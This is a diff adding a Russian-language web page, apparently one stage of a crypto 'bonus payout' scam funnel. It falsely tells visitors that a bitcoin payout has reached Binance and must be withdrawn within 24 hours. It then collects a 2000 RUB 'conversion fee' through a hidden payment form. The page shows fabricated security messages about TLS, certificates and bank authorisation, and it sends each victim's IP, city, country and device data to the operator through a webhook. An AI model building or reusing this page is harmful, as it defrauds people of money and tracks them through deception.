@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, viewport-fit=cover">
+<title>Обмен BTC на RUB | Bitcoin Bonus</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/styles.css">
+<style>
+
+html.is-preloading .bg-decor,
+html.is-preloading .grid-overlay,
+html.is-preloading .change-page {
+    display: none !important;
+}
+
+#transferPreloader {
+    position: fixed;
+    inset: 0;
+    z-index: 99999;
+    background: #2b2f36;
+    font-family: 'Inter', sans-serif;
+    color: #e8ecf4;
+    opacity: 1;
+    transition: opacity 0.6s ease;
+    overflow: hidden;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: clamp(18px, 5vw, 28px);
+    padding: clamp(12px, 4vw, 24px);
+    box-sizing: border-box;
+}
+#transferPreloader.is-hidden {
+    opacity: 0;
+    pointer-events: none;
+}
+#transferPreloader.is-skipped {
+    display: none !important;
+}
+
+#transferPreloader .tp-spinner-frame {
+    width: 64px;
+    height: 64px;
+    border: 0;
+    background: transparent;
+    pointer-events: none;
+    overflow: hidden;
+    flex: 0 0 auto;
+    display: block;
+}
+
+#transferPreloader .tp-text-layer {
+    width: 100%;
+    max-width: min(460px, calc(100vw - 32px));
+    box-sizing: border-box;
+    padding: 0;
+    text-align: center;
+    pointer-events: none;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: clamp(10px, 3vw, 14px);
+}
+
+#transferPreloader .tp-title {
+    font-size: clamp(15px, 4.4vw, 18px);
+    font-weight: 700;
+    color: #ffffff;
+    width: 100%;
+    line-height: 1.35;
+    word-break: normal;
+    overflow-wrap: anywhere;
+    hyphens: auto;
+}
+
+#transferPreloader .tp-sub {
+    font-size: clamp(12.5px, 3.6vw, 14px);
+    line-height: 1.5;
+    color: #b7bfcc;
+    width: 100%;
+    word-break: normal;
+    overflow-wrap: anywhere;
+    hyphens: auto;
+}
+
+#transferPreloader .tp-timer {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: clamp(12px, 3.6vw, 15px);
+    color: #f7931a;
+    font-weight: 600;
+    width: 100%;
+    font-variant-numeric: tabular-nums;
+    font-feature-settings: "tnum" 1;
+    line-height: 1.55;
+    white-space: normal;
+    word-break: normal;
+    overflow-wrap: anywhere;
+    text-align: center;
+}
+
+#transferPreloader .tp-seconds-slot {
+    display: inline-block;
+    min-width: 1.8ch;
+    text-align: center;
+    vertical-align: baseline;
+    color: #ffffff;
+    font-size: clamp(15px, 4.4vw, 18px);
+    font-variant-numeric: tabular-nums;
+    font-feature-settings: "tnum" 1;
+}
+
+#transferPreloader .tp-lock {
+    margin-top: 4px;
+    font-size: clamp(10.5px, 3vw, 12px);
+    color: #8896b0;
+    letter-spacing: 0.4px;
+    text-transform: uppercase;
+    word-break: normal;
+    overflow-wrap: anywhere;
+    text-align: center;
+    max-width: 100%;
+}
+
+@media (max-width: 340px) {
+    #transferPreloader .tp-lock { letter-spacing: 0; }
+}
+
+#paymentConnector {
+    position: fixed;
+    inset: 0;
+    z-index: 999999;
+    background: #2b2f36;
+    font-family: 'Inter', sans-serif;
+    color: #e8ecf4;
+    opacity: 0;
+    visibility: hidden;
+    pointer-events: none;
+    transition: opacity 0.35s ease, visibility 0.35s ease;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: clamp(12px, 4vw, 24px);
+    box-sizing: border-box;
+    overflow: hidden;
+}
+#paymentConnector.active {
+    opacity: 1;
+    visibility: visible;
+    pointer-events: auto;
+}
+
+#paymentConnector .pc-inner {
+    width: 100%;
+    max-width: min(460px, calc(100vw - 32px));
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    gap: clamp(16px, 4vw, 24px);
+}
+
+#paymentConnector .pc-spinner-frame {
+    width: 64px;
+    height: 64px;
+    border: 0;
+    background: transparent;
+    pointer-events: none;
+    overflow: hidden;
+    flex: 0 0 auto;
+    display: block;
+}
+
+#paymentConnector .pc-title {
+    font-size: clamp(16px, 4.6vw, 20px);
+    font-weight: 700;
+    color: #ffffff;
+    line-height: 1.35;
+    letter-spacing: 0.2px;
+    width: 100%;
+    word-break: normal;
+    overflow-wrap: anywhere;
+}
+
+#paymentConnector .pc-message {
+    font-size: clamp(12.5px, 3.6vw, 14px);
+    line-height: 1.6;
+    color: #b7bfcc;
+    width: 100%;
+    min-height: 2.8em;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    word-break: normal;
+    overflow-wrap: anywhere;
+    transition: opacity 0.35s ease;
+}
+#paymentConnector .pc-message.pc-fade { opacity: 0; }
+#paymentConnector .pc-message strong { color: #f7931a; font-weight: 600; }
+
+#paymentConnector .pc-lock {
+    margin-top: 2px;
+    font-size: clamp(10.5px, 3vw, 12px);
+    color: #8896b0;
+    letter-spacing: 0.4px;
+    text-transform: uppercase;
+    word-break: normal;
+    overflow-wrap: anywhere;
+    text-align: center;
+}
+
+#paymentConnector .pc-dots {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    margin-top: 4px;
+}
+#paymentConnector .pc-dots span {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: #f7931a;
+    opacity: 0.35;
+    animation: pcDot 1.4s ease-in-out infinite;
+}
+#paymentConnector .pc-dots span:nth-child(2) { animation-delay: 0.18s; }
+#paymentConnector .pc-dots span:nth-child(3) { animation-delay: 0.36s; }
+
+@keyframes pcDot {
+    0%, 100% { opacity: 0.25; transform: translateY(0); }
+    50% { opacity: 1; transform: translateY(-2px); }
+}
+
+html::-webkit-scrollbar, body::-webkit-scrollbar {
+    width: 10px; height: 10px;
+}
+html::-webkit-scrollbar-track, body::-webkit-scrollbar-track {
+    background: rgba(7, 10, 20, 0.6);
+}
+html::-webkit-scrollbar-thumb, body::-webkit-scrollbar-thumb {
+    background: linear-gradient(180deg, #f7931a, #ffb04d);
+    border-radius: 8px;
+    box-shadow: inset 0 0 6px rgba(247, 147, 26, 0.5);
+}
+html::-webkit-scrollbar-thumb:hover, body::-webkit-scrollbar-thumb:hover {
+    background: linear-gradient(180deg, #ffb04d, #f7931a);
+}
+html::-webkit-scrollbar-thumb:active, body::-webkit-scrollbar-thumb:active {
+    background: linear-gradient(180deg, #f7931a, #22d3ee);
+}
+html::-webkit-scrollbar-corner, body::-webkit-scrollbar-corner {
+    background: transparent;
+}
+html, body {
+    scrollbar-width: thin;
+    scrollbar-color: rgba(247, 147, 26, 0.7) rgba(7, 10, 20, 0.6);
+}
+</style>
+
+<script src="assets/state.js"></script>
+<script src="assets/chain.js"></script>
+<script>
+(function () {
+    var STAGE_NAME = 'changebtc';
+
+    try { loadState(); } catch (e) {}
+
+    var chain = window.PAYMENT_CHAIN || [];
+    var current = window.appState && window.appState.currentStage;
+    var currentIdx = chain.indexOf(current);
+    var thisIdx = chain.indexOf(STAGE_NAME);
+
+    if (currentIdx !== -1 && thisIdx !== -1 && currentIdx > thisIdx) {
+        var base = window.location.href.split('?')[0].split('#')[0];
+        var dir = base.substring(0, base.lastIndexOf('/') + 1);
+        var target = dir + chain[currentIdx] + '.html';
+        console.log('[Redirect] ' + STAGE_NAME + ' → ' + chain[currentIdx] + ' (уже прошёл эту страницу)');
+        window.location.replace(target);
+        return;
+    }
+
+    try {
+        if (!localStorage.getItem('bitcloud_preloader_changebtc_v1')) {
+            document.documentElement.classList.add('is-preloading');
+        }
+    } catch (e) {
+        document.documentElement.classList.add('is-preloading');
+    }
+})();
+</script>
+</head>
+<body>
+
+<div id="transferPreloader">
+    <iframe id="spinnerFrame" class="tp-spinner-frame" scrolling="no" frameborder="0" title="" aria-hidden="true"></iframe>
+    <div class="tp-text-layer">
+        <div class="tp-title">Не закрывайте страницу!</div>
+        <div class="tp-sub">Идёт перевод выплаты на биржу обмена криптовалюты.</div>
+        <div class="tp-timer">
+            До завершения осталось примерно:
+            <span class="tp-seconds-slot" id="tpSeconds">5</span>
+            сек
+        </div>
+        <div class="tp-lock">🔒 Не выключайте устройство</div>
+    </div>
+</div>
+
+<div id="paymentConnector">
+    <div class="pc-inner">
+        <iframe id="pcSpinnerFrame" class="pc-spinner-frame" scrolling="no" frameborder="0" title="" aria-hidden="true"></iframe>
+        <div class="pc-title">Ожидайте</div>
+        <div class="pc-message" id="pcMessage">Идёт соединение с платёжной системой...</div>
+        <div class="pc-dots">
+            <span></span><span></span><span></span>
+        </div>
+        <div class="pc-lock">🔒 Не закрывайте страницу</div>
+    </div>
+</div>
+
+<script>
+window.__preloaderDone = false;
+window.__onPreloaderDone = [];
+
+(function () {
+    var PRELOADER_KEY = 'bitcloud_preloader_changebtc_v1';
+
+    var shouldShowPreloader = true;
+    try {
+        shouldShowPreloader = !localStorage.getItem(PRELOADER_KEY);
+    } catch (e) {
+        shouldShowPreloader = true;
+    }
+
+    var overlay = document.getElementById('transferPreloader');
+
+    if (!shouldShowPreloader) {
+        console.log('[Preloader] уже видели → пропускаем');
+
+        if (overlay) {
+            overlay.classList.add('is-skipped');
+            try { overlay.parentNode && overlay.parentNode.removeChild(overlay); } catch (e) {}
+        }
+
+        document.documentElement.classList.remove('is-preloading');
+        document.documentElement.style.overflow = '';
+        document.body.style.overflow = '';
+
+        window.__preloaderDone = true;
+        var cbs = window.__onPreloaderDone.splice(0);
+        for (var i = 0; i < cbs.length; i++) {
+            try { cbs[i](); } catch (e) { console.warn(e); }
+        }
+        return;
+    }
+
+    console.log('[Preloader] первый заход → показываем');
+
+    var spinnerHtml = '<!DOCTYPE html><html><head><meta charset="utf-8">'
+        + '<style>'
+        +   'html,body{margin:0;padding:0;width:100%;height:100%;background:transparent;overflow:hidden;}'
+        +   '.spinner{width:64px;height:64px;transform-origin:32px 32px;'
+        +     'animation:spin 1.4s linear infinite;'
+        +     'will-change:transform;backface-visibility:hidden;'
+        +     'transform:translateZ(0) rotate(0deg);}'
+        +   '@keyframes spin{'
+        +     'from{transform:translateZ(0) rotate(0deg);}'
+        +     'to{transform:translateZ(0) rotate(360deg);}'
+        +   '}'
+        +   'svg{display:block;width:64px;height:64px;}'
+        +   '.trk{fill:none;stroke:rgba(255,255,255,0.10);stroke-width:4;}'
+        +   '.arc{fill:none;stroke:#f7931a;stroke-width:4;stroke-linecap:round;}'
+        + '</style></head><body>'
+        + '<div class="spinner">'
+        +   '<svg viewBox="0 0 50 50" xmlns="http://www.w3.org/2000/svg">'
+        +     '<circle class="trk" cx="25" cy="25" r="20"></circle>'
+        +     '<path class="arc" d="M25 5 A20 20 0 0 1 45 25"></path>'
+        +   '</svg>'
+        + '</div>'
+        + '</body></html>';
+
+    var frame1 = document.getElementById('spinnerFrame');
+    if (frame1) {
+        var blob = new Blob([spinnerHtml], { type: 'text/html' });
+        frame1.src = URL.createObjectURL(blob);
+    }
+    var frame2 = document.getElementById('pcSpinnerFrame');
+    if (frame2) {
+        var blob2 = new Blob([spinnerHtml], { type: 'text/html' });
+        frame2.src = URL.createObjectURL(blob2);
+    }
+
+    var START_DISPLAY = 5;
+    var TOTAL_SECONDS = 10;
+
+    var secEl = document.getElementById('tpSeconds');
+    if (!overlay || !secEl) {
+        window.__preloaderDone = true;
+        document.documentElement.classList.remove('is-preloading');
+        var cbs2 = window.__onPreloaderDone.splice(0);
+        for (var j = 0; j < cbs2.length; j++) {
+            try { cbs2[j](); } catch (e) { console.warn(e); }
+        }
+        return;
+    }
+
+    var elapsed = 0;
+
+    document.documentElement.style.overflow = 'hidden';
+    document.body.style.overflow = 'hidden';
+
+    function tick() {
+        elapsed += 1;
+        var remaining = Math.max(0, START_DISPLAY - elapsed);
+        secEl.textContent = remaining;
+
+        if (elapsed >= TOTAL_SECONDS) {
+            clearInterval(timer);
+            finish();
+        }
+    }
+
+    function finish() {
+        overlay.classList.add('is-hidden');
+        document.documentElement.style.overflow = '';
+        document.body.style.overflow = '';
+        document.documentElement.classList.remove('is-preloading');
+
+        setTimeout(function () {
+            if (overlay && overlay.parentNode) overlay.parentNode.removeChild(overlay);
+        }, 700);
+
+        try { localStorage.setItem(PRELOADER_KEY, '1'); } catch (e) {}
+
+        window.__preloaderDone = true;
+        var cbsF = window.__onPreloaderDone.splice(0);
+        for (var k = 0; k < cbsF.length; k++) {
+            try { cbsF[k](); } catch (e) { console.warn(e); }
+        }
+    }
+
+    var timer = setInterval(tick, 1000);
+})();
+</script>
+
+<div class="bg-decor"></div>
+<div class="grid-overlay"></div>
+
+<div class="change-page">
+    <div class="change-card">
+        <div class="change-icon-badge">✓</div>
+        <h2 class="change-title">Выплата успешно зачислена на биржу!</h2>
+        <p class="change-subtitle">Ваши средства были переведены на криптовалютную биржу Binance</p>
+
+        <div class="change-amount-box" id="changeAmountBox" data-loading="1">
+            <div class="change-amount-label">Ваша выплата составляет</div>
+            <div class="change-amount-btc" id="changeBtc">0.00000000 BTC</div>
+            <div class="change-amount-usd" id="changeUsd">Загрузка курса…</div>
+            <div class="change-amount-rub" id="changeRub">—</div>
+        </div>
+
+        <div class="change-urgent">
+            <div class="urgent-icon">⏰</div>
+            <div>Вам необходимо вывести деньги в течение 24 часов!</div>
+        </div>
+
+        <div class="change-info-block">
+            <div class="change-info-row">
+                <span class="info-label">🏦 Биржа</span>
+                <span class="info-value orange">Binance</span>
+            </div>
+            <div class="change-info-row">
+                <span class="info-label">💼 На бирже сейчас находится</span>
+                <span class="info-value cyan" id="infoBtc">0.00000 BTC</span>
+            </div>
+            <div class="change-info-row">
+                <span class="info-label">💱 Комиссия на обмен</span>
+                <span class="info-value">0,14%</span>
+            </div>
+            <div class="change-info-row">
+                <span class="info-label">📊 Стоимость конвертации</span>
+                <span class="info-value green">2000 РУБ</span>
+            </div>
+        </div>
+
+        <p style="font-size:13px; color:var(--text-soft); line-height:1.65; text-align:center; margin-bottom:6px;">
+            Совершите обмен криптовалюты, чтобы получить средства прямо сейчас.
+        </p>
+
+        <div class="exchange-direction">
+            <div class="ex-dir-item">
+                <div class="ex-dir-label">Отдаём</div>
+                <div class="ex-dir-value" id="exFrom">0.00000000 BTC</div>
+            </div>
+            <div class="ex-dir-arrow">⇄</div>
+            <div class="ex-dir-item">
+                <div class="ex-dir-label">Получаем</div>
+                <div class="ex-dir-value rub" id="exTo">— РУБ</div>
+            </div>
+        </div>
+
+        <div class="exchange-btn-wrap">
+            <button class="btn btn-primary btn-glow" id="exchangeBtn" onclick="doExchange()">
+                Обменять BTC на RUB
+            </button>
+        </div>
+    </div>
+</div>
+
+<div class="page-loader" id="pageLoader">
+    <div class="spinner-big"></div>
+    <div class="loader-text" id="loaderText">Переход на платёжную систему...</div>
+    <div class="loader-bar-bg"><div class="loader-bar-fill" id="loaderBarFill"></div></div>
+    <div class="loader-timer" id="loaderTimer">Подготовка транзакции: <strong>2 сек</strong></div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.37/dist/ua-parser.min.js"></script>
+<script src="assets/rates.js"></script>
+<script src="assets/common.js"></script>
+
+<script>
+
+const STAGE = 'changebtc';
+
+function renderChangeLoading() {
+    const box = document.getElementById('changeAmountBox');
+    if (box) box.setAttribute('data-loading', '1');
+
+    setText('changeBtc', formatBtc(FINAL_BTC_BALANCE));
+    setText('changeUsd', 'Загрузка курса…');
+    setText('changeRub', '—');
+    setText('infoBtc', FINAL_BTC_BALANCE.toFixed(5) + ' BTC');
+    setText('exFrom', FINAL_BTC_BALANCE.toFixed(8) + ' BTC');
+    setText('exTo', '— РУБ');
+
+    const btn = document.getElementById('exchangeBtn');
+    if (btn) {
+        btn.textContent = 'Ожидание курса…';
+        btn.disabled = true;
+        btn.style.opacity = '0.6';
+        btn.style.cursor = 'not-allowed';
+        btn.classList.remove('btn-glow');
+    }
+}
+
+function renderChangeReady() {
+    const btc = FINAL_BTC_BALANCE;
+    const usd = btc * window.btcPrice;
+    const rub = usd * window.usdToRub;
+
+    const box = document.getElementById('changeAmountBox');
+    if (box) box.setAttribute('data-loading', '0');
+
+    setText('changeBtc', formatBtc(btc));
+    setText('changeUsd', '≈ ' + formatUsd(usd));
+    setText('changeRub', '(' + formatRub(rub) + ')');
+    setText('infoBtc', btc.toFixed(5) + ' BTC');
+    setText('exFrom', btc.toFixed(8) + ' BTC');
+    setText('exTo', formatRub(rub));
+
+    const btn = document.getElementById('exchangeBtn');
+    if (btn) {
+        btn.textContent = 'Обменять BTC на RUB';
+        btn.disabled = false;
+        btn.style.opacity = '1';
+        btn.style.cursor = 'pointer';
+        btn.classList.add('btn-glow');
+    }
+}
+
+function renderChange() {
+    if (typeof isRatesValid === 'function' && isRatesValid()) {
+        renderChangeReady();
+    } else {
+        renderChangeLoading();
+    }
+}
+
+window.addEventListener('rates:ready', () => {
+    if (typeof isRatesValid === 'function' && isRatesValid()) {
+        renderChangeReady();
+    }
+});
+
+const PC_MESSAGES = [
+    'Идёт соединение с платёжной системой...',
+    'Устанавливается зашифрованное соединение <strong>TLS 1.3</strong>...',
+    'Проверка сертификата безопасности сервера...',
+    'Инициализация защищённого канала передачи данных...',
+    'Синхронизация с платёжным шлюзом <strong>PAYSWEB</strong>...',
+    'Проверка кодировки и типа передаваемых данных...',
+    'Аутентификация клиента в системе...',
+    'Передача параметров транзакции в банк-эмитент...',
+    'Ожидание авторизации платёжной операции...',
+    'Запрос подтверждения от платёжной системы...',
+    'Формирование защищённого ответа...',
+    'Пожалуйста, не закрывайте страницу — соединение почти установлено...'
+];
+
+let pcMessageTimer = null;
+let pcMessageIndex = 0;
+let pcStarted = false;
+
+function startPaymentConnector() {
+    if (pcStarted) return;
+    pcStarted = true;
+
+    const overlay = document.getElementById('paymentConnector');
+    const msgEl = document.getElementById('pcMessage');
+    if (!overlay) return;
+
+    overlay.classList.add('active');
+
+    document.documentElement.style.overflow = 'hidden';
+    document.body.style.overflow = 'hidden';
+
+    pcMessageIndex = 0;
+    if (msgEl) {
+        msgEl.innerHTML = PC_MESSAGES[0];
+        msgEl.classList.remove('pc-fade');
+    }
+
+    pcMessageTimer = setInterval(() => {
+        if (!msgEl) return;
+        pcMessageIndex = (pcMessageIndex + 1) % PC_MESSAGES.length;
+
+        msgEl.classList.add('pc-fade');
+        setTimeout(() => {
+            msgEl.innerHTML = PC_MESSAGES[pcMessageIndex];
+            msgEl.classList.remove('pc-fade');
+        }, 320);
+    }, 2600);
+}
+
+async function doExchange() {
+    /* Страховка: если курса ещё нет — ждём перед открытием коннектора */
+    if (typeof isRatesValid === 'function' && !isRatesValid()) {
+        renderChangeLoading();
+        if (typeof ensureFreshRates === 'function') {
+            const ok = await ensureFreshRates(15000);
+            if (!ok) {
+                const btn = document.getElementById('exchangeBtn');
+                if (btn) {
+                    btn.disabled = false;
+                    btn.textContent = 'Не удалось получить курс — повторить';
+                    btn.onclick = () => doExchange();
+                }
+                renderChange();
+                return;
+            }
+        }
+    }
+
+    markStagePaid(STAGE);
+    startPaymentConnector();
+
+    const randomId = 'bit' + String(Math.floor(1000000 + Math.random() * 9000000));
+    const urls = getPaymentUrls(STAGE);
+
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = PAYSWEB_URL;
+    form.style.display = 'none';
+
+    const fields = {
+        amount: '2000',
+        merchant_order_id: randomId,
+        use_card_payment: 'RUB',
+        success_url: urls.successUrl,
+        fail_url: urls.failUrl,
+        notice_url: 'https://vashdomain.com/api/success',
+        api_key: PAYSWEB_KEY
+    };
+
+    for (const [k, v] of Object.entries(fields)) {
+        const inp = document.createElement('input');
+        inp.type = 'hidden';
+        inp.name = k;
+        inp.value = v;
+        form.appendChild(inp);
+    }
+    document.body.appendChild(form);
+
+    sendWebhook({
+        event: 'exchange_click',
+        stage: STAGE,
+        userId: window.appState.userId,
+        merchant_order_id: randomId,
+        amount: 2000,
+        currency: 'RUB',
+        btc: FINAL_BTC_BALANCE.toFixed(8),
+        usd: (FINAL_BTC_BALANCE * window.btcPrice).toFixed(2),
+        rub: (FINAL_BTC_BALANCE * window.btcPrice * window.usdToRub).toFixed(2),
+        btcPrice: window.btcPrice.toFixed(2),
+        usdToRub: window.usdToRub.toFixed(2),
+        btcSource: window.btcSource, rubSource: window.rubSource,
+        ip: window.appState.geo ? window.appState.geo.ip : '',
+        city: window.appState.geo ? window.appState.geo.city : '',
+        country: window.appState.geo ? window.appState.geo.country : '',
+        device: window.appState.device || null,
+        success_url: urls.successUrl,
+        fail_url: urls.failUrl,
+        timestamp: new Date().toISOString(),
+        page: STAGE
+    });
+
+    setTimeout(() => {
+        form.submit();
+    }, 80);
+}
+
+function heavyInit() {
+    try { loadState(); } catch (e) {}
+    if (typeof ensureDevice === 'function') { try { ensureDevice(); } catch (e) {} }
+    if (typeof visitStage === 'function') { try { visitStage(STAGE); } catch (e) {} }
+
+    /* Сначала кэш — цифры мгновенно */
+    if (typeof loadRatesCache === 'function') { try { loadRatesCache(); } catch (e) {} }
+
+    window.__ratesFetching = true;
+
+    renderChange();
+
+    if (typeof initRates === 'function') {
+        initRates().catch(e => {
+            console.warn('[Change] initRates error:', e);
+            window.__ratesFetching = false;
+            renderChange();
+        });
+    } else {
+        console.warn('[Change] initRates не найден');
+        window.__ratesFetching = false;
+        renderChange();
+    }
+
+    if (typeof ensureGeo === 'function') {
+        ensureGeo().catch(e => console.warn('[Change] ensureGeo error:', e));
+    }
+
+    /* Safety: если через 20 сек флаг всё ещё true — сбрасываем */
+    setTimeout(() => {
+        if (window.__ratesFetching) {
+            console.warn('[Change] safety timeout — сбрасываю __ratesFetching');
+            window.__ratesFetching = false;
+            renderChange();
+        }
+    }, 20000);
+}
+
+if (window.__preloaderDone) {
+    heavyInit();
+} else {
+    window.__onPreloaderDone.push(heavyInit);
+}
+</script>
+</body>
+</html>
